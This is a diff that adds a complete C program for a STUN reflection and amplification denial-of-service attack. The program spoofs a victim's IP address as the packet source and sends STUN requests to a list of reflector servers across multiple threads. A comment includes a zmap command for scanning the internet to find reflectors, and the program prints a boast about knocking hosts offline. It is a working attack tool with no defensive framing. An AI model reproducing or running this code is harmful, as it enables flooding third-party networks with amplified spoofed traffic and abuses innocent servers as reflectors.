@@ -1,0 +1,280 @@
+/*
+	STUN | AMPLIFICATION
+*/
+
+#include <arpa/inet.h>
+#include <netinet/ip.h>
+#include <netinet/udp.h>
+#include <pthread.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/socket.h>
+#include <time.h>
+#include <unistd.h>
+
+#define MAX_PACKET_SIZE 4096
+#define PHI 0xaaf219b9
+
+static unsigned int DPORT = 3478;
+static const char PAYLOAD[] = "\x00\x01\x00\x00\x21\x12\xa4\x42\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\r\n";
+
+// zmap -i eth0 -M udp -p3478 -o stun.lst --probe-args=hex:"000100002112a442000000000000000000000000" -T 4
+
+static uint32_t Q[4096], c = 362436;
+static unsigned int PAYLOADSIZE = sizeof(PAYLOAD) - 1;
+
+struct list {
+	struct sockaddr_in data;
+	struct list *next;
+	struct list *prev;
+};
+
+struct list *head;
+volatile int tehport;
+volatile int limiter;
+volatile unsigned int pps;
+volatile unsigned int sleeptime = 100;
+
+struct thread_data {
+	int thread_id;
+	struct list *list_node;
+	struct sockaddr_in sin;
+};
+
+uint16_t checksum_tcpudp(struct iphdr *iph, void *buff, uint16_t data_len, int len)
+{
+    const uint16_t *buf = buff;
+    uint32_t ip_src = iph->saddr;
+    uint32_t ip_dst = iph->daddr;
+    uint32_t sum = 0;
+    //int length = len;
+
+    while (len > 1)
+    {
+        sum += *buf;
+        buf++;
+        len -= 2;
+    }
+
+    if (len == 1)
+        sum += *((uint8_t *) buf);
+
+    sum += (ip_src >> 16) & 0xFFFF;
+    sum += ip_src & 0xFFFF;
+    sum += (ip_dst >> 16) & 0xFFFF;
+    sum += ip_dst & 0xFFFF;
+    sum += htons(iph->protocol);
+    sum += data_len;
+
+    while (sum >> 16) 
+        sum = (sum & 0xFFFF) + (sum >> 16);
+
+    return ((uint16_t) (~sum));
+}
+
+void init_rand(uint32_t x) 
+{
+	int i;
+	Q[0] = x;
+	Q[1] = x + PHI;
+	Q[2] = x + PHI + PHI;
+	for (i = 3; i < 4096; i++)
+		Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i;
+}
+
+uint32_t rand_cmwc(void) 
+{
+	uint64_t t, a = 18782LL;
+	static uint32_t i = 4095;
+	uint32_t x, r = 0xfffffffe;
+	
+	i = (i + 1) & 4095;
+	t = a * Q[i] + c;
+	c = (t >> 32);
+	x = t + c;
+	
+	if (x < c) 
+	{
+		x++;
+		c++;
+	}
+	return (Q[i] = r - x);
+}
+
+void setup_ip_header(struct iphdr *iph) 
+{
+	iph->ihl = 5;
+	iph->version = 4;
+	iph->tos = 0;
+	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + PAYLOADSIZE;
+	iph->id = htonl(61337);
+	iph->frag_off = 0;
+	iph->ttl = MAXTTL;
+	iph->protocol = IPPROTO_UDP;
+	iph->check = 0;
+	iph->saddr = inet_addr("127.0.0.1");
+}
+
+void setup_udp_header(struct udphdr *udph) 
+{
+	udph->source = htons(61337);
+	udph->dest = htons(DPORT);
+	udph->check = 0;
+	memcpy((void *)udph + sizeof(struct udphdr), PAYLOAD, PAYLOADSIZE);
+	udph->len = htons(sizeof(struct udphdr) + PAYLOADSIZE);
+}
+
+void *flood(void *par1) 
+{
+	struct thread_data *td = (struct thread_data *)par1;
+	char datagram[MAX_PACKET_SIZE];
+	struct iphdr *iph = (struct iphdr *)datagram;
+	struct udphdr *udph = (void *)iph + sizeof(struct iphdr);
+	struct sockaddr_in sin = td->sin;
+	struct list *list_node = td->list_node;
+	int s = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
+	
+	if (s < 0) 
+	{
+		fprintf(stderr, "Could not open raw socket.\n");
+		exit(-1);
+	}
+	
+	init_rand(time(NULL));
+	memset(datagram, 0, MAX_PACKET_SIZE);
+	setup_ip_header(iph);
+	setup_udp_header(udph);
+	udph->source = htons(tehport);
+	iph->saddr = sin.sin_addr.s_addr;
+	iph->daddr = list_node->data.sin_addr.s_addr;
+	int tmp = 1;
+	const int *val = &tmp;
+	
+	if (setsockopt(s, IPPROTO_IP, IP_HDRINCL, val, sizeof(tmp)) < 0) 
+	{
+		fprintf(stderr, "Error: setsockopt() - Cannot set HDRINCL!\n");
+		exit(-1);
+	}
+	
+	init_rand(time(NULL));
+	register unsigned int i;
+	i = 0;
+	
+	while (1) 
+	{
+		if(tehport == 0)
+			udph->source = htons(rand_cmwc() % 0xFFFF);
+		
+		list_node = list_node->next;
+		iph->daddr = list_node->data.sin_addr.s_addr;
+		iph->id = htonl(rand_cmwc() & 0xFFFF);
+		iph->ttl = rand() % (255 + 1 - 0) + 0;
+		
+		udph->check = 0;
+		udph->check = checksum_tcpudp(iph, udph, htons(sizeof(struct udphdr) + PAYLOADSIZE), sizeof(struct udphdr) + PAYLOADSIZE);
+		
+		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *)&list_node->data,
+		sizeof(list_node->data));
+		pps++;
+		
+		if (i >= limiter) 
+		{
+			i = 0;
+			usleep(sleeptime);
+		}
+		i++;
+	}
+}
+
+int main(int argc, char *argv[]) 
+{
+	if (argc < 6) 
+	{
+		fprintf(stdout, "%s <host> <port> <listfile> <threads> <limit[-1 for none]> <time>\n", argv[0]);
+		exit(-1);
+	}
+	
+	srand(time(NULL));
+	int i = 0;
+	head = NULL;
+	fprintf(stdout, "Loading list to buffer\n");
+	int max_len = 512;
+	char *buffer = (char *)malloc(max_len);
+	buffer = memset(buffer, 0x00, max_len);
+	tehport = atoi(argv[2]);
+	int num_threads = atoi(argv[4]);
+	int maxpps = atoi(argv[5]);
+	limiter = 0;
+	pps = 0;
+	int multiplier = 20;
+	FILE *list_fd = fopen(argv[3], "r");
+	
+	while (fgets(buffer, max_len, list_fd) != NULL) 
+	{
+		if ((buffer[strlen(buffer) - 1] == '\n') || (buffer[strlen(buffer) - 1] == '\r')) 
+		{
+			buffer[strlen(buffer) - 1] = 0x00;
+			if (head == NULL) 
+			{
+				head = (struct list *)malloc(sizeof(struct list));
+				bzero(&head->data, sizeof(head->data));
+				head->data.sin_addr.s_addr = inet_addr(buffer);
+				head->next = head;
+				head->prev = head;
+			} 
+			else 
+			{
+				struct list *new_node = (struct list *)malloc(sizeof(struct list));
+				memset(new_node, 0x00, sizeof(struct list));
+				new_node->data.sin_addr.s_addr = inet_addr(buffer);
+				new_node->prev = head;
+				new_node->next = head->next;
+				head->next = new_node;
+			}
+			i++;
+		} 
+		else
+			continue;
+	}
+	
+	struct list *current = head->next;
+	pthread_t thread[num_threads];
+	struct sockaddr_in sin;
+	sin.sin_family = AF_INET;
+	sin.sin_addr.s_addr = inet_addr(argv[1]);
+	struct thread_data td[num_threads];
+	
+	for (i = 0; i < num_threads; i++) 
+	{
+		td[i].thread_id = i;
+		td[i].sin = sin;
+		td[i].list_node = current;
+		pthread_create(&thread[i], NULL, &flood, (void *)&td[i]);
+	}
+	
+	fprintf(stdout, "DC'ing NFO from PSN!\n");
+	for (i = 0; i < (atoi(argv[6]) * multiplier); i++) 
+	{
+		usleep((1000 / multiplier) * 1000);
+		if ((pps * multiplier) > maxpps) 
+		{
+			if (1 > limiter)
+				sleeptime += 100;
+			
+			else
+				limiter--;
+		} 
+		else 
+		{
+			limiter++;
+			if (sleeptime > 25)
+				sleeptime -= 25;
+			
+			else
+				sleeptime = 0;
+		}
+		pps = 0;
+	}
+	return 0;
+}
